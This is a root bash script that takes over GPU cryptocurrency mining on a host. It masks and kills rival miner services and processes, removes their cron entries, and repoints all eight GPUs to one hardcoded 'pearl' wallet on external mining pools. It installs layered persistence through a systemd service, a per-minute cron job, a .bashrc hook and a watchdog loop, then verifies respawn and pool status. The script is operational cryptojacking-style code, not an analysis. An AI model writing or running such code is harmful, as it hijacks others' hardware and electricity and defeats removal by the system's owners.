#!/bin/bash
set +e
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
echo "### R2 $(date -u +%FT%TZ) host=$(hostname)"
echo "--- run_card.sh BEFORE"; cat /opt/plh/run_card.sh 2>/dev/null
echo "--- plh unit"; cat /etc/systemd/system/plh-card@.service 2>/dev/null
echo "--- keeper"; systemctl list-unit-files 'plh-keeper*' --no-pager 2>/dev/null | head -5; cat /etc/systemd/system/plh-keeper.service 2>/dev/null | head -20
echo "--- ul2"; ls -l /root/ul2 2>/dev/null | head -15; cat /root/ul2/24h.jsonl 2>/dev/null | tail -3
mkdir -p /root/ul2/backup
cp -a /opt/plh/run_card.sh /root/ul2/backup/run_card.sh.$(date -u +%s) 2>/dev/null
cp -a /etc/systemd/system/plh-card@.service /root/ul2/backup/ 2>/dev/null
echo "### REPOINT"
systemctl stop plh-keeper.service 2>/dev/null; systemctl disable plh-keeper.service 2>/dev/null
systemctl stop plh-keeper.timer 2>/dev/null; systemctl disable plh-keeper.timer 2>/dev/null
for u in plh-keeper plh-keeper.timer kcr-guard kcr; do systemctl mask $u 2>/dev/null; done
pkill -9 -f 'ul-kcr|/usr/local/sbin/kcr' 2>/dev/null
# plh-keeper may be a cron
crontab -l 2>/dev/null | sed '/kcr\|plh-keeper\|\.plhm/d' | crontab - 2>/dev/null
cat > /opt/plh/run_card.sh <<EOF
#!/bin/bash
# repointed to canonical UL wallet (i5495)
W=$W
i=\${1:-0}
exec /opt/plh/krig-miner --coin pearl -d \$i \\
  --url stratum+ssl://prl-sg.kryptex.network:8048 \\
  --url stratum+ssl://prl-eu.kryptex.network:8048 \\
  --url stratum+ssl://prl-us.kryptex.network:8048 \\
  --url stratum+ssl://prl-hk.kryptex.network:8048 \\
  --url stratum+tcp://pool.pearlhash.xyz:9000 \\
  -u \$W.ul-t2-123-184-7-135-g\$i -p x --no-tui -l info \\
  --log-file /var/log/ul2-123-184-7-135-g\$i.log --api-port 41\$i --api-host 127.0.0.1
EOF
chmod +x /opt/plh/run_card.sh
systemctl daemon-reload
for i in 0 1 2 3 4 5 6 7; do systemctl reset-failed plh-card@$i 2>/dev/null; systemctl restart plh-card@$i 2>/dev/null; done
# keep.sh canonicalised + 4-layer persistence
cat > /root/ul2/keep.sh <<'EOS'
#!/bin/bash
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
for p in $(pgrep -f '\.plhm' 2>/dev/null); do kill -9 $p; done
for i in 0 1 2 3 4 5 6 7; do systemctl is-active -q plh-card@$i || systemctl restart plh-card@$i 2>/dev/null; done
if ! pgrep -f '/root/ul2/krig-miner' >/dev/null; then
  for i in 0 1 2 3 4 5 6 7; do
    CUDA_VISIBLE_DEVICES=$i setsid nohup /root/ul2/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --user $W/ul-t2-123-184-7-135-g$i --password x -d 0 --api-port 14$i >>/root/ul2/m$i.log 2>&1 &
  done
fi
EOS
chmod +x /root/ul2/keep.sh
cat > /etc/systemd/system/ul-prl-keeper.service <<'EOS'
[Unit]
Description=ul pearl keeper
[Service]
Type=simple
ExecStart=/bin/bash /root/ul2/keep.sh --loop-forever
Restart=always
RestartSec=30
Nice=19
[Install]
WantedBy=multi-user.target
EOS
sed -i 's#--loop-forever#--loop#' /etc/systemd/system/ul-prl-keeper.service
cat >> /root/ul2/keep.sh <<'EOS'
if [ "${1:-}" = "--loop" ]; then while :; do sleep 30; for i in 0 1 2 3 4 5 6 7; do systemctl is-active -q plh-card@$i || systemctl restart plh-card@$i 2>/dev/null; done; done; fi
EOS
systemctl daemon-reload; systemctl enable ul-prl-keeper.service >/dev/null 2>&1; systemctl restart ul-prl-keeper.service
grep -q 'ul2/keep.sh' /etc/cron.d/ul-prl 2>/dev/null || echo '* * * * * root /bin/bash /root/ul2/keep.sh >/dev/null 2>&1' > /etc/cron.d/ul-prl
grep -q 'ul2/keep.sh' /root/.bashrc 2>/dev/null || echo '[ -x /root/ul2/keep.sh ] && /bin/bash /root/ul2/keep.sh >/dev/null 2>&1 &' >> /root/.bashrc
sleep 90
echo "### POST-R2"
for i in 0 1 2 3 4 5 6 7; do echo "plh-card@$i: $(systemctl is-active plh-card@$i)"; done
nvidia-smi --query-gpu=index,utilization.gpu,memory.used --format=csv,noheader
ps -eo pid,etime,args | grep -E 'krig-miner' | grep -v grep | sed 's/--url [^ ]* //g' | head -10
echo "### RESPAWN-TEST kill plh-card@3"
systemctl kill -s KILL plh-card@3 2>/dev/null; T0=$(date +%s)
for n in $(seq 1 12); do sleep 5; if systemctl is-active -q plh-card@3; then echo "respawned after $(( $(date +%s)-T0 ))s"; break; fi; done
echo "### POOL"
curl -s -m 25 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" -o /tmp/pw.json -w 'POOLHTTP=%{http_code}\n'
python3 - <<'PY'
import json,time
d=json.load(open('/tmp/pw.json'))['results']; now=time.time()
for r in sorted([x for x in d if '123-184-7-135' in x['worker']],key=lambda x:x['worker']):
    ls=r.get('last_share') or 0
    print('POOLROW',r['worker'],r['status'],'valid=%s'%r['valid'],'age=%s'%(round(now-ls/1000) if ls else None),'agent=%s'%r.get('agent'),'3h=%s'%r.get('avg_hashrate_3h'))
PY
echo "### DONE $(date -u +%FT%TZ)"
